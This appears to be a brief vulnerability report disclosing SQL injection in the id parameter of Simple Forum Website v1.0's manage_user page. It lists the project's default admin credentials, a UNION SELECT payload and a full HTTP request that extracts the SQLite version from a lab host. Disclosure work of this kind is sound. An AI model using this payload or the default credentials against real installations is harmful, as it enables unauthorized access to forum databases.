# Simple Forum Website v1.0 has SQL injection

BUG_AUTHOR: za4ch

The password for the backend login account is: admin/sourcecodester&123

vendors: https://www.sourcecodester.com/php/16423/simple-forum-website-using-php-and-sqlite3-source-code-free-download.html

Vulnerability File: /php-sqlite-forum/?page=manage_user&id=

Vulnerability location: /php-sqlite-forum/?page=manage_user&id=, id

[+] Payload: /php-sqlite-forum/?page=manage_user&id=0' union select 1,sqlite_version(),3,4,5; // Leak place ---> id

```sql
GET /php-sqlite-forum/?page=manage_user&id=0%27%20union%20select%201,sqlite_version(),3,4,5; HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=7a79pb4okpo5vekml899q8q4f0
Connection: close
```

![image](https://github.com/user-attachments/assets/9b76dce7-d7b9-4120-83eb-35ea8efd185c)
